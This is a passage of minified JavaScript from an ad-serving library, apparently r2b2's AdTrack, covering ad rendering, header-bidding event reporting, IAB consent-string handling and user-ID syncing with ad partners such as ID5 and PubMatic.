          d.setAttribute("src", t.options.publisher.imp), d.setAttribute("style", "position:absolute; display:none; height:1; width:1;"), this.renderer.wrap.appendChild(d);
        } else this.doError("Publisher imp pixel not displayed");
        if (this.rendered = !0, this.wfHasLoad = !0, this.checkForRefresh(), !this.shouldReturnDummyAd()) {
          var c,
            h = 0,
            l = 0;
          o && o.bidResponse && (h = o.bidResponse.width, l = o.bidResponse.height), this.nthb && "function" == typeof this.nthb.isRefreshing && !this.nthb.isRefreshing() && (c = o.nthbBid, this.nthb.served());
          var u = !!c && c.beatHb,
            p = !!c && c.beatNhb;
          this.evLoad(t, e, i, r, h, l, o.uib, u, p);
        }
        if (this.multi && (this.multi.load++, this.skip[this.pass] || (this.skip[this.pass] = {}), this.isNTHB2 || (this.skip[this.pass][this.t] = !0), this.handleMulti()), this.status = 1, t.options.onLoad) new Function("response", "chd", "var l = " + t.options.onLoad + ".bind(this); l(response,chd)").bind(this)(n, e);
        this.metrics.evProfiling("Loaded ad from: " + e.tag + "#" + e.flag, "cnc debug"), -1 !== e.tag.indexOf("criteo-hb") && AdTrack.Criteo.impression(this.unitID.getName(), e.tag, e.flag);
      } catch (t) {
        this.doError("Error in load - " + t.message);
      }
      try {
        if (!this.getOption("preventPublisherManipulation")) {
          var f = this.window;
          if (f === window.top) this.container.setAttribute("data-adtrack-id", this.unitID.getName());else {
            for (; f.parent !== window.top;) f = f.parent;
            f.frameElement.setAttribute("data-adtrack-id", this.unitID.getName());
          }
        }
      } catch (t) {}
      try {
        var g = "",
          m = {},
          k = "";
        o.bidResponse && (k = o.bidResponse.getCreativeId() || ""), o.price && (m = {
          cpm: o.price.getPrice(),
          id: o.price.getDealId() || "",
          crid: k
        }), "function" == typeof o.report && (g = o.report()), this.settings.creativeLogId && this.settings.creativeLogId > 0 && "sklik" !== e.tag && "seznam-ssp" !== e.tag && AdTrack.Utils.reportCreative(this.server, this.settings.creativeLogId, e.tag, k, m.id || "", m.cpm || "", g), AdTrack.Cookies.getCookie("adtrack_testlog", !0) && this.settings.publisher && "mafra" === this.settings.publisher.tag ? "sklik" !== e.tag && "seznam-ssp" !== e.tag && AdTrack.Utils.reportCreative(this.server, 45, e.tag, k, m.id || "", m.cpm || "", g) : e.logs && e.logs.creative ? AdTrack.Utils.reportCreative(this.server, e.logs.creative, e.tag, k, m.id || "", m.cpm || "", g) : e.logs && e.logs.response && o.response && AdTrack.Utils.reportCreative(this.server, e.logs.response, e.tag, k, m.id || "", m.cpm || "", o.response), AdTrack.Ext.sendResponse(this.unitID, e.tag, e.flag, {
          price: m,
          response: g
        }, a);
      } catch (t) {}
    },
    getSupplyChain: function (t) {
      var e = ["asi", "sid", "hp", "rid", "name", "domain"];
      if (this.settings.publisher && this.settings.publisher.id) {
        var i = [{
          asi: "r2b2.cz",
          sid: this.settings.publisher.parentId || this.settings.publisher.id,
          hp: 1
        }];
        if (t) {
          var r = "1.0,1";
          return i.forEach(function (t) {
            r += "!";
            var i = [];
            e.forEach(function (e) {
              i.push(t[e] ? t[e] : "");
            }), r += i.join(",");
          }), r;
        }
        return {
          ver: "1.0",
          complete: 1,
          nodes: i
        };
      }
      if ("grid.id" === this.domain) {
        var n = !this.settings.publisher ? "no publisher" : "no id";
        this.metrics.evProfiling(n, "schain");
      }
    },
    getActualChannel: function (t, e) {
      return t || (t = this.pass), e || (e = this), e.channelMap[t] ? e.channelMap[t] : null;
    },
    getNS: function (t, e) {
      return t.querySelectorAll("." + e);
    },
    setText: function (t, e) {
      return Array.prototype.forEach.call(t, function (t) {
        t.innerHTML = e;
      }.bind(this)), t;
    },
    setAttribute: function (t, e, i) {
      return Array.prototype.forEach.call(t, function (t) {
        t.setAttribute(e, i);
      }.bind(this)), t;
    },
    setZoomin: function (t, e) {
      return Array.prototype.forEach.call(t, function (t) {
        if ("scale" == e) {
          var i = "scale(0.98,0.98)";
          t.style.webkitTransform = i, t.style.MozTransform = i, t.style.msTransform = i, t.style.OTransform = i, t.style.transform = i;
        } else "opacity" == e && (t.style.opacity = .5);
        t.style.transition = "transform 5s, opacity 5s", t.style.transformOrigin = "0% 0%";
        var r = AdTrack.Viewability.Handler(),
          n = AdTrack.Viewability.Probe(this.window, function () {
            return AdTrack.Viewability.getVisiblePercentage(t);
          }, AdTrack.Viewability.getBasicCallback(r));
        setTimeout(function () {
          r.addCallback(function (i) {
            if (n.dispose(), "scale" == e) {
              t.style.webkitTransform = "scale(1,1)", t.style.MozTransform = "scale(1,1)", t.style.msTransform = "scale(1,1)", t.style.OTransform = "scale(1,1)", t.style.transform = "scale(1,1)";
            } else "opacity" == e && (t.style.opacity = 1);
          });
        }.bind(this), 3e3);
      }.bind(this)), t;
    },
    clearClass: function (t, e) {
      return Array.prototype.forEach.call(t, function (t) {
        t.className = t.className.replace(e, "").trim(), "" == t.className && t.removeAttribute("class");
      }.bind(this)), null;
    },
    handleMulti: function () {
      if (this.viewabilityHandler) {
        if (this.multi && this.multi.pb < 3 && !0 !== this.multi.stop) {
          var t = this.viewabilityHandler.getViewabilityTime() + this.cycleTime;
          this.viewabilityHandler.addCallback(function () {
            this.multiNext();
          }.bind(this), t);
        }
      } else this.doError("MULTI: No viewability handler available");
    },
    multiNext: function () {
      if (!0 !== this.multi.stop) if (this.isNTHB && this.nthb) {
        var t = this.definition.waterfall.tiers[this.pass + 1],
          e = t && "hb" === t.method || !t || this.pass === this.nthb.getPass() && !this.nthb.hasValidBids(),
          i = this.nthb.getNext(this.isNTHB2 && !e);
        if (i) {
          this.pass = this.nthb.getPass();
          var r = i.getChannel(),
            n = this.getStyles(i.getWfChannel());
          this.t = i.getIndex(), this.channelMap[this.pass] = r, this.render(this.definition, r, n);
        } else this.passback(this.definition, null);
      } else this.isNTHB2 ? this.passback(this.definition, null) : this.getOption("multiDisableRestart") || (this.pass = 0, this.runWaterfall(this.definition));
    },
    doError: function (t, e, i) {
      this.errorReporting.doError(t, this.unitID, e, i);
    },
    doPbjError: function (t, e) {
      AdTrack.Prebid.error(t, this.unitID, e);
    },
    evPageView: function (t) {
      try {
        window.top.AdTrack = window.top.AdTrack || {}, window.top.AdTrack.pageview || (this.reporting.doPageView(t), window.top.AdTrack.pageview = AdTrack.Utils.simpleStringGenerator(50));
      } catch (e) {
        AdTrack.pageview || (this.reporting.doPageView(t), AdTrack.pageview = AdTrack.Utils.simpleStringGenerator(50));
      }
    },
    evAdRequest: function () {
      var t, e, i;
      try {
        window.top.AdTrack = window.top.AdTrack || {}, window.top.AdTrack.req || (window.top.AdTrack.req = {}), e = 0, t = window.top.AdTrack.req;
      } catch (i) {
        AdTrack.req || (AdTrack.req = {}), e = 1, t = AdTrack.req;
      }
      var r = this.unitID.getName();
      t[r] ? t[r]++ : t[r] = 1, i = t[r] > 1 ? 1 : 0, this.reporting.doAdRequest(i, e);
    },
    evAdStart: function (t) {
      "function" == typeof this.reporting.doAdStart && this.reporting.doAdStart(t);
    },
    evDisplayRequest: function () {
      "function" == typeof this.reporting.doDisplayRequest && this.reporting.doDisplayRequest();
    },
    evPlacementPassback: function () {
      "function" == typeof this.reporting.doPlacementPassback && this.reporting.doPlacementPassback();
    },
    reportClick: function (t, e, i, r, n, s, a) {
      var o = this.getChannelKey(e, a);
      this.clickReported || (this.reporting.reportClick(t, e, i, r, n, s, a, o), this.clickReported = !0);
    },
    evClick: function (t, e, i, r, n, s, a, o) {
      var d = this.getChannelKey(e, o);
      this.clickReported || (this.reporting.doClick(t, e, i, r, n, s, a, o, d), this.clickReported = !0);
    },
    evPreload: function (t, e, i, r) {
      "function" == typeof this.reporting.doPreload && this.reporting.doPreload(t, e, i, r);
    },
    evImpress: function (t, e, i, r) {
      r = Math.round(100 * (r || 0)) / 100;
      var n = this.getChannelKey(e, i);
      this.reporting.doImpress(t, e, i, r, n), this.multi && "classic_jizdnirady.cz_generic_750x100middle" === this.unitID.getName() && ("google" !== e.tag && "google-dfp" !== e.tag || (this.multi.stop = !0));
    },
    evBidConsent: function (t, e, i, r) {
      this.reporting.doBidConsent(t, e, i, r);
    },
    evClickConfirm: function (t, e) {
      "function" == typeof this.reporting.doClickConfirm && this.reporting.doClickConfirm(t, e);
    },
    startBidRequest: function (t, e, i) {
      var r = e.chd;
      AdTrack.UserID && "function" == typeof AdTrack.UserID.getBinary && (e.uib = AdTrack.UserID.getBinary());
      var n = this.getChannelCount(r.keys);
      this.evBidRequest(t, r, n, e.uib), r.pending = !0, setTimeout(function () {
        r.pending && this.track.evTimeout(t, r);
      }.bind(this), i);
    },
    evBidRequest: function (t, e, i, r) {
      "function" == typeof this.reporting.doBidRequest && this.reporting.doBidRequest(t, e, i, r);
    },
    evFilteredRequest: function (t, e) {
      "function" == typeof this.reporting.doFilteredRequest && this.reporting.doFilteredRequest(t, e);
    },
    evBidResponse: function (t, e, i, r, n, s, a, o) {
      "function" == typeof this.reporting.doBidResponse && this.reporting.doBidResponse(t, e, i, r, n, s, a, o);
    },
    evPassback: function (t, e, i) {
      null != e && (e.pending = !1), i ? this.reporting.doPassback(t, e, i, AdTrack.Cookies.cookiesEnabled) : this.reporting.doPassback(t, e);
    },
    evTimeout: function (t, e) {
      this.reporting.doTimeout(t, e);
    },
    evBidTimeout: function (t, e, i) {
      this.reporting.doBidTimeout(t, e, i);
    },
    evBidError: function (t, e, i) {
      this.reporting.doBidError(t, e, i);
    },
    evBidTime: function (t, e, i, r) {
      this.unitID && "classic_echo24.cz_generic_480x300" === this.unitID.getName() && this.reporting.doBidTime(t, e, i, r);
    },
    evLoad: function (t, e, i, r, n, s, a, o, d) {
      null != e && (e.pending = !1);
      var c = this.getChannelKey(e, r);
      this.reporting.doLoad(t, e, i, r, c, n, s, a, o, d);
    },
    evKeywords: function (t) {
      null != this.keywordLogUrl && AdTrack.KeywordsModule && this.reporting.doKeywords(t);
    },
    createPbjReportingValidation: function () {
      var t = function (t) {
          this.settings.publisher && "global24SRO" === this.settings.publisher.tag || this.doPbjError(t);
        }.bind(this),
        e = 0,
        i = 0;
      return {
        call: function () {
          ++e > 1 && t("Placement called multiple times.");
        },
        adUnits: function () {
          ++i > 1 && t("AdUnits event called multiple times.");
        },
        bidRequest: function () {
          0;
        },
        timeout: function () {
          0;
        },
        bidDone: function () {
          0;
        },
        noBid: function () {
          0;
        },
        bid: function () {
          0;
        },
        win: function () {
          0;
        },
        load: function () {
          0;
        },
        reset: function () {
          e = i = 0;
        }
      };
    },
    stopLookUp: function () {
      this.definition.options.hb && this.definition.options.hb.onlyPrebid && this.definition.options.hb.prebidAdUnitsPath && AdTrack.pbUnitsLookUp.stopLookUp(this.definition.options.hb.prebidAdUnitsPath);
    },
    evPbjCall: function (t) {
      "function" == typeof this.reporting.doPbjCall ? this.pbjCall || (this.pbjCall = !0, this.pbjValidation.call(), this.reporting.doPbjCall(t, !!this.prebidUnit)) : this.doPbjError("Cant report, 'doPbjCall' is not a function.");
    },
    evPbjAdUnits: function (t, e, i) {
      "function" == typeof this.reporting.doPbjAdUnits ? this.pbjAdUnits || (this.pbjAdUnits = !0, this.pbjValidation.adUnits(), this.reporting.doPbjAdUnits(t, e, i)) : this.doPbjError("Cant report, 'doPbjAdUnits' is not a function.");
    },
    evPbjInAuction: function (t) {
      if (t && (-1 !== t.indexOf("Bsz") || -1 !== t.indexOf("tKl") || -1 !== t.indexOf("Kie"))) {
        var e = "",
          i = 0;
        if (t.length < 20) {
          for (var r = 0; r < t.length; r++) {
            i++, e += t.charCodeAt(r) + " ";
          }
          this.doError("Weird adunit passed '" + t + "', len: " + i + "(" + t.length + "), chars: " + e);
        }
      }
      this.stopLookUp(), "function" == typeof this.reporting.doPbjInAuction ? this.reporting.doPbjInAuction(t) : this.doPbjError("Cant report, 'doPbjInAuction' is not a function.");
    },
    evPbjBidRequest: function (t, e) {
      this.stopLookUp(), "function" == typeof this.reporting.doPbjBidRequest ? (this.pbjValidation.bidRequest(), this.reporting.doPbjBidRequest(t, e)) : this.doPbjError("Cant report, 'doPbjBidRequest' is not a function.");
    },
    evPbjBidRequestDebug: function (t, e, i, r, n, s, a) {
      "function" == typeof this.reporting.doPbjBidRequest ? this.reporting.doPbjBidRequest(t, e, !0, i, r, n, s, a) : this.doPbjError("Cant report, 'doPbjBidRequest' is not a function.");
    },
    evPbjTimeout: function (t, e) {
      "function" == typeof this.reporting.doPbjTimeout ? (this.pbjValidation.timeout(), this.reporting.doPbjTimeout(t, e)) : this.doPbjError("Cant report, 'doPbjTimeout' is not a function.");
    },
    evPbjTimeoutDebug: function (t, e) {
      "function" == typeof this.reporting.doPbjTimeout ? this.reporting.doPbjTimeout(t, e, !0) : this.doPbjError("Cant report, 'doPbjTimeout' is not a function.");
    },
    evPbjBidDone: function (t, e) {
      "function" == typeof this.reporting.doPbjBidDone ? (this.pbjValidation.bidDone(), this.reporting.doPbjBidDone(t, e)) : this.doPbjError("Cant report, 'doPbjBidDone' is not a function.");
    },
    evPbjNoBid: function (t, e) {
      "function" == typeof this.reporting.doPbjNoBid ? (this.pbjValidation.noBid(), this.reporting.doPbjNoBid(t, e)) : this.doPbjError("Cant report, 'doPbjNoBid' is not a function.");
    },
    evPbjBid: function (t, e, i, r, n) {
      var s = AdTrack.hb2 && AdTrack.hb2.getCurrentRequestForAdUnit && AdTrack.hb2.getCurrentRequestForAdUnit(this.unitID),
        a = s && s.getAssignedBid(),
        o = a && a.channel && a.channel.chd;
      "function" == typeof this.reporting.doPbjBid ? (this.pbjValidation.bid(), this.reporting.doPbjBid(t, e, o, i, r, n)) : this.doPbjError("Cant report, 'doPbjBid' is not a function.");
    },
    evPbjWin: function (t, e, i, r) {
      var n = AdTrack.hb2 && AdTrack.hb2.getCurrentRequestForAdUnit && AdTrack.hb2.getCurrentRequestForAdUnit(this.unitID),
        s = n && n.getAssignedBid(),
        a = s && s.channel && s.channel.chd;
      "function" == typeof this.reporting.doPbjWin ? (this.pbjValidation.win(), this.reporting.doPbjWin(t, e, a, i, r)) : this.doPbjError("Cant report, 'doPbjWin' is not a function.");
    },
    evPbjLoad: function (t, e, i, r) {
      var n = AdTrack.hb2 && AdTrack.hb2.getCurrentRequestForAdUnit && AdTrack.hb2.getCurrentRequestForAdUnit(this.unitID),
        s = n && n.getAssignedBid(),
        a = s && s.channel && s.channel.chd;
      "function" == typeof this.reporting.doPbjLoad ? (this.pbjValidation.load(), this.reporting.doPbjLoad(t, e, a, i, r)) : this.doPbjError("Cant report, 'doPbjLoad' is not a function.");
    },
    log: function (t) {},
    isBanner: function (t) {
      return t.length > 0 && t[0].isBanner;
    },
    rhtmlspecialchars: function (t) {
      return "string" == typeof t && (t = (t = (t = (t = (t = t.replace(/&gt;/gi, ">")).replace(/&lt;/gi, "<")).replace(/&#039;/g, "'")).replace(/&quot;/gi, '"')).replace(/&amp;/gi, "&")), t;
    },
    noquerystring: function (t) {
      return t.split("?")[0];
    },
    escapeRegExp: function (t) {
      return t.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&");
    },
    createEvent: function (t) {
      return AdTrack.Utils.createEvent(this.document, t);
    },
    addEvent: function (t, e, i) {
      AdTrack.Utils.addEvent(t, e, i);
    },
    removeEvent: function (t, e, i) {
      AdTrack.Utils.removeEvent(t, e, i);
    },
    jsonp: function (t, e, i, r) {
      r = r || 0 === r ? r : this.settings.timeout ? this.settings.timeout : 5e3, AdTrack.Utils.jsonp(t, e, i, r);
    },
    shouldCsync: function (t) {
      var e = this.definition.options.customCsyncWhiteList,
        i = this.definition.options.customCsyncBlackList;
      return (!i || !i.indexOf || -1 === i.indexOf(t)) && (!e || !e.indexOf || -1 !== e.indexOf(t));
    },
    getReporting: function (t) {
      return t && "hbbtv" === t ? new AdTrack.JsonPReport(this.domain, this.group, this.position, this.type, this.server, this.keywordLogUrl) : AdTrack.XhrReport.getPlacementReport(this.domain, this.group, this.position, this.type, AdTrack.Config.getReportingUrl(), this.keywordLogUrl);
    },
    getChannelKeyFallback: function (t) {
      var e = t.keys;
      return e[Object.keys(e)[0]] ? e[Object.keys(e)[0]] : null;
    },
    getChannelKey: function (t, e) {
      return !t.keys && t.data ? "data" : null == e || 0 == e.length ? t.keys[1] ? t.keys[1] : this.getChannelKeyFallback(t) : e.count && t.keys[e.count] ? t.keys[e.count] : this.getChannelKeyFallback(t);
    },
    getChannelCount: function (t) {
      var e = Object.keys(t);
      return e[0] ? e[0] : 0;
    },
    getOption: function (t, e) {
      return this.definitionWrapper.getOption(t, e);
    },
    setDebugMode: function () {
      this.debugMode = !0;
    },
    debug: function (t, e, i) {},
    shouldReturnDummyAd: function () {
      return !("function" != typeof AdTrack.DummyAds && !this.dummyAds) && this.settings.dummyAds && !0 === this.settings.dummyAds;
    },
    highlight: function (t) {
      this.renderer && this.renderer.highlight(t);
    }
  };
}, function (t, e) {
  !function () {
    var t = window;
    try {
      window.top.AdTrack = window.top.AdTrack || {}, t = window.top;
    } catch (t) {}
    var e = function () {
      var t = null,
        e = null,
        i = null,
        r = null,
        n = !1,
        s = !1,
        a = !1,
        o = [],
        d = [],
        c = !1,
        h = "",
        l = null,
        u = null,
        p = !1,
        f = void 0,
        g = AdTrack.XhrReport.getGenericReport(AdTrack.Config.getReportingUrl()),
        m = function (t) {
          t = t || o;
          for (var e = 0; e < t.length; e++) try {
            t[e]();
          } catch (t) {}
        },
        k = function (t, e) {
          return function (i, r) {
            if (r) {
              if (void 0 === f && Number.isInteger(i.listenerId) && (f = i.listenerId), i.listenerId !== f) return;
              "function" == typeof t && t(i);
            } else "function" == typeof e && e();
          };
        },
        b = function (t) {
          var e,
            r = {};
          try {
            e = window.__tcfapi || window.top.__tcfapi;
          } catch (t) {}
          if ("function" == typeof e) {
            c = !0, i = 2;
            var n = function (t) {
                !a && function (t) {
                  return !1 === t.gdprApplies || "tcloaded" === t.eventStatus || "useractioncomplete" === t.eventStatus;
                }(t) && (a = !0, m(d), d = []);
              },
              s = function (e) {
                (function (t) {
                  return (!1 === t.gdprApplies || t.tcString) && ("tcloaded" === t.eventStatus || "useractioncomplete" === t.eventStatus || "cmpuishown" === t.eventStatus);
                })(e) && t(e);
              },
              o = function (t, r) {
                r && n(t), a || setTimeout(function () {
                  e("getTCData", i, o);
                }, 500);
              },
              h = function (t, e) {
                e && s(t), o(t, e);
              },
              l = k(function (t) {
                s(t), n(t);
              }, function () {
                e("getTCData", i, h);
              });
            p || (e("addEventListener", i, l), p = !0);
          } else {
            for (var u = window, f = null; !f;) {
              try {
                u.frames.__tcfapiLocator && (f = u, i = 2);
              } catch (t) {}
              if (u === window.top) break;
              u = u.parent;
            }
            if (!f) return C("CMP not found.");
            var g = k(t, function () {
              b("getTCData", i, f, t);
            });
            p || (b("addEventListener", i, f, g), p = !0);
          }
          function b(t, e, i, n) {
            window.__tcfapi = function (t, e, n, s) {
              var a = Math.random() + "",
                o = {
                  __tcfapiCall: {
                    command: t,
                    parameter: s,
                    version: e,
                    callId: a
                  }
                };
              r[a] = n, i.postMessage(o, "*");
            }, window.addEventListener("message", function (t) {
              let e = {};
              try {
                e = "string" == typeof t.data ? JSON.parse(t.data) : t.data;
              } catch (t) {}
              const i = e.__tcfapiReturn;
              i && "function" == typeof r[i.callId] && r[i.callId](i.returnValue, i.success);
            }, !1), window.__tcfapi(t, e, function (t, e) {
              n(t, e);
            });
          }
        },
        v = function () {
          ("done" !== e || "done" === e && s) && (e = "done", clearInterval(l), clearTimeout(u), t && g.cmpSuccess(h, n, r));
        },
        A = function (e, i, n) {
          T(e) ? (w(e), y() && ("iab" === n && AdTrack.Utils.setLocalStorageItem("AT-euconsent-v2", JSON.stringify(t)), r = 2, h = n, v(), i())) : C("Invalid CMP format");
        },
        T = function (t) {
          return !(!t || "object" != typeof t);
        },
        y = function () {
          if (!t) return !1;
          var e = t.consentString;
          return e && "string" == typeof e && e.length && e.length > 0;
        },
        w = function (e) {
          t = {
            tcfPolicyVersion: e.tcfPolicyVersion || i,
            consentString: e.tcString || e.consentData || e.consentString,
            gdprApplies: e.gdprApplies,
            purpose: e.purpose || {},
            vendor: e.vendor || {},
            addtlConsent: e.addtlConsent
          };
        },
        C = function (t) {},
        U = {
          getConsentData: function () {
            return t;
          },
          getAddtlConsentAsArray: function () {
            if (t && t.addtlConsent) {
              var e = t.addtlConsent;
              if (-1 !== e.indexOf("~")) {
                var i = e.substring(e.indexOf("~") + 1);
                if (i) return i.split(".").map(function (t) {
                  return parseInt(t, 10);
                });
              }
            }
            return [];
          },
          waitForTcf: function (t) {
            a ? t() : d.push(AdTrack.Utils.singleUseCallback(t));
          },
          waitForConsent: function (t, i) {
            if ("function" == typeof t) if ("done" === e || s) t();else {
              var r = AdTrack.Utils.singleUseCallback(t);
              i && setTimeout(function () {
                r();
              }, i), o.push(r);
            }
          },
          fn: function () {}
        };
      return function (t) {
        if (y()) t();else {
          var i = function (r) {
              A(r, t, "iab"), "done" !== e && setTimeout(function () {
                b(i);
              }, 100);
            },
            r = AdTrack.Utils.getLocalStorageItem("AT-euconsent-v2"),
            a = AdTrack.Utils.getLocalStorageItem("euconsent-v2"),
            o = AdTrack.Utils.readCookie("eupubconsent-v2"),
            d = null;
          try {
            d = JSON.parse(r);
          } catch (t) {}
          if (r && d ? A(d, t, "cookie") : (a || o) && A({
            gdprApplies: !0,
            tcString: o || a
          }, t, "cookie"), "done" === e && (b(function () {}), c || l || (l = setInterval(function () {
            c ? clearInterval(l) : b(function () {});
          }, 300))), !l && "done" !== e) {
            l = setInterval(function () {
              c || b(i);
            }, 100), u = setTimeout(function () {
              v(), s = !0, m();
            }, 1e4);
            var h = setTimeout(function () {
              "done" !== e && (n = !0), clearTimeout(h);
            }, 1e3);
          }
        }
      }(m), U;
    };
    if (t.AdTrack.CMP && "function" == typeof t.AdTrack.CMP.fn) try {
      t.AdTrack.CMP.fn();
    } catch (i) {
      t.AdTrack.CMP = e();
    } else t.AdTrack.CMP = e();
    window.AdTrack.CMP = t.AdTrack.CMP;
  }();
}, function (t, e, i) {
  "use strict";

  i.r(e);
  var r = i(6);
  AdTrack.UserSync = AdTrack.UserSync || r.a;
}, function (t, e) {
  AdTrack.PWTWrap = AdTrack.PWTWrap || {
    load: function (t, e) {
      !function () {
        if (!AdTrack.Libs.getLib("pubmatic-pwt")) {
          var i;
          try {
            i = window.location.href;
          } catch (t) {}
          var r = "//ads.pubmatic.com/AdServer/js/pwt/158361/";
          r += e ? "10180" : "3614";
          var n = "";
          if (i.indexOf("pwtv=") > 0) {
            var s = /pwtv=(.*?)(&|$)/g.exec(i);
            s.length >= 2 && s[1].length > 0 && (n = "/" + s[1]);
          }
          var a = r + n + "/pwt.js";
          AdTrack.Libs.deploy("pubmatic-pwt", a).onload(function () {
            t();
          });
        }
      }();
    }
  }, AdTrack.Id5Wrap = AdTrack.Id5Wrap || {
    load: function (t) {
      AdTrack.Libs.getLib("id5-api") || AdTrack.Libs.deploy("id5-api", "//cdn.id5-sync.com/api/1.0/id5-api.js").onload(function () {
        t();
      });
    }
  }, function () {
    var t = window,
      e = !1,
      i = {};
    try {
      window.top.AdTrack = window.top.AdTrack || {}, t = window.top, e = (i = AdTrack.Config.getUserID()).forceStop;
    } catch (t) {}
    if (e && -1 === t.location.href.indexOf("r2b2-test-userid")) return null;
    var r = function () {
      var t = i.useId5Lib,
        e = null,
        r = null,
        n = "",
        s = AdTrack.Utils.time(),
        a = 0,
        o = 0,
        d = i.storage || "r2b2-pwt-cache",
        c = i.storageExpiration || "r2b2-pwt-cache-exp",
        h = i.cookie || "r2b2-pwt-cache",
        l = null;
      l = t ? i.id5 || "ID5" : i.pwt || "IHPWT";
      var u = !1,
        p = !1,
        f = !1,
        g = !1,
        m = {},
        k = {},
        b = null,
        v = null,
        A = [],
        T = null,
        y = null,
        w = null,
        C = AdTrack.XhrReport.getGenericReport(AdTrack.Config.getReportingUrl()),
        U = AdTrack.Utils.errorReporting(AdTrack.Config.getServerURL(), AdTrack.url, !1),
        x = i.idWhitelist,
        S = {
          intentIqId: {
            atype: 1,
            source: "intentiq.com"
          },
          pubcid: {
            atype: 1,
            source: "pubcid.org"
          },
          tdid: {
            atype: 1,
            source: "adserver.org",
            getUidExt: function () {
              return {
                rtiPartner: "TDID"
              };
            }
          },
          id5id: {
            isValid: function (t) {
              return t && t.uid && "0" !== t.uid;
            },
            getValue: function (t) {
              return t.uid;
            },
            atype: 1,
            source: "id5-sync.com",
            getUidExt: function (t) {
              if (t.ext) return t.ext;
            }
          },
          parrableId: {
            getValue: function (t) {
              return t.eid ? t.eid : t.ccpaOptout ? "" : null;
            },
            atype: 1,
            source: "parrable.com",
            getUidExt: function (t) {
              if (t.ibaOptout || t.ccpaOptout) {
                var e = {};
                return t.ibaOptout && (e.ibaOptout = t.ibaOptout), t.ccpaOptout && (e.ccpaOptout = t.ccpaOptout), e;
              }
            }
          },
          idl_env: {
            atype: 3,
            source: "liveramp.com"
          },
          lipb: {
            getValue: function (t) {
              return t.lipbid;
            },
            atype: 3,
            source: "liveintent.com",
            getEidExt: function (t) {
              if (Array.isArray(t.segments) && t.segments.length) return {
                segments: t.segments
              };
            }
          },
          britepoolid: {
            atype: 3,
            source: "britepool.com"
          },
          lotamePanoramaId: {
            atype: 1,
            source: "crwdcntrl.net"
          },
          criteoId: {
            atype: 1,
            source: "criteo.com"
          },
          merkleId: {
            atype: 3,
            getSource: function (t) {
              return t && t.ext && t.ext.ssp ? t.ext.ssp + ".merkleinc.com" : "merkleinc.com";
            },
            getValue: function (t) {
              return t.id;
            },
            getUidExt: function (t) {
              return t.keyID ? {
                keyID: t.keyID
              } : t.ext ? t.ext : void 0;
            }
          },
          netId: {
            atype: 1,
            source: "netid.de"
          },
          sharedid: {
            atype: 1,
            source: "sharedid.org"
          },
          IDP: {
            atype: 1,
            source: "zeotap.com"
          },
          haloId: {
            atype: 1,
            source: "audigent.com"
          },
          quantcastId: {
            atype: 1,
            source: "quantcast.com"
          }
        },
        E = function (t) {
          return t && "[object Object]" === Object.prototype.toString.call(t);
        },
        P = function () {
          return E(m) ? Object.keys(m).length : 0;
        },
        R = function () {
          Object.keys(m).forEach(function (t) {
            S[t] || (k[t] || U.doError("Unknown user id '" + t + "'"), k[t] = !0);
          });
        },
        I = function (t) {
          var e = 0,
            i = {
              0: "pubcid",
              1: "criteoId",
              2: "id5id",
              3: "idl_env",
              4: "tdid",
              5: "lotamePanoramaId",
              6: "czechAdId",
              7: "amxId",
              8: "topics",
              9: "haloId",
              10: "lipb",
              11: "quantcastId",
              12: "IDP",
              13: "britepoolid",
              14: "merkleId",
              15: "netId",
              16: "intentIqId",
              17: "sharedid",
              18: "parrableId"
            };
          t && Object.keys(i).reverse().forEach(function (r) {
            e <<= 1, function (t, e) {
              if (!t || !t[e]) return !1;
              var i = t[e],
                r = S[e];
              return r && "function" == typeof r.isValid ? r.isValid(i) : !r || "function" != typeof r.getValue || r.getValue(i);
            }(t, i[r]) && e++;
          });
          return e;
        },
        O = function () {
          for (var t = 0; t < A.length; t++) try {
            A[t]();
          } catch (t) {}
        },
        D = function () {
          if (e) try {
            var t = e.getUserIds();
            if (E(t)) return t;
          } catch (t) {
            U.doError("User ID - pwt fetch failed");
          } else !function () {
            try {
              (e = window[l] || window.top[l]) && "function" == typeof e.getUserIds || (e = null);
            } catch (t) {}
          }();
          return null;
        },
        B = function (t, e, i) {
          t = N(t), i && (m = t, u = !0), e ? v = t : (b = t, function (t) {
            var e = new Date();
            e.setTime(e.getTime() + 12096e5);
            var i = e.toUTCString();
            AdTrack.Utils.setLocalStorageItem(d, JSON.stringify(t)), AdTrack.Utils.setLocalStorageItem(c, i);
          }(t));
        },
        N = function (t) {
          if (t && x && Array.isArray(x)) {
            var e = {};
            return x.forEach(function (i) {
              t[i] && (e[i] = t[i]);
            }), e;
          }
          return t;
        },
        _ = function (t) {
          var e = function () {
              clearInterval(T), clearTimeout(y);
            },
            i = function (e) {
              B(e, !1, !u), a = AdTrack.Utils.time() - s;
              var i,
                r,
                n,
                o,
                d = I(v),
                c = I(b);
              C.userIdLoad(a, d, c), t && !g && t(), i = 0, r = !1, n = P(), o = 0, w = setInterval(function () {
                var t,
                  e = D();
                if (e = N(e)) {
                  B(e, !1, !1);
                  try {
                    t = JSON.stringify(e) !== JSON.stringify(m);
                  } catch (t) {
                    clearInterval(w), U.doError("Used ID - stringify failed");
                  }
                  t && (r = !0, o = AdTrack.Utils.time());
                }
                if (++i >= 10) {
                  clearInterval(w), B(b, !1, !0);
                  var s = P() - n;
                  C.userIdFinal(r, s, o), r && R();
                }
              }, 500), R();
            },
            r = function () {
              var t = D();
              E(t) && (f = !0, e(), i(t));
            };
          y || (y = setTimeout(function () {
            !0, e();
          }, 5e3)), T ? r() : T = setInterval(r, 100);
        },
        M = function (e, i) {
          t ? function (t) {
            var e = setTimeout(function () {
              g = !0, t();
            }, 5e3);
            AdTrack.Id5Wrap.load(function () {
              try {
                (r = window[l] || window.top[l]) && "function" == typeof r.init || (r = null);
              } catch (t) {}
              r && !g && r.init({
                partnerId: 678
              }).onAvailable(function (i) {
                var r = {
                  id5id: {
                    ext: {
                      linkType: i.getLinkType()
                    },
                    uid: i.getUserId()
                  }
                };
                f = !0, n || (n = "id5"), B(r, !1, !0), o = p ? AdTrack.Utils.time() - s : 0, a = AdTrack.Utils.time() - s, C.userIdFetch(n, p, o), clearTimeout(e);
                var d = I(v),
                  c = I(b);
                C.userIdLoad(a, d, c), C.userIdFinal(!1, 0, a), t();
              });
            });
          }(e) : function (t, e) {
            if (AdTrack.PWTWrap.load(function () {
              u || _(t);
            }, e), n || (n = "pwt"), o = p ? AdTrack.Utils.time() - s : 0, C.userIdFetch(n, p, o), _(u ? null : t), u) t();else var i = setTimeout(function () {
              u || (g = !0, t()), clearTimeout(i);
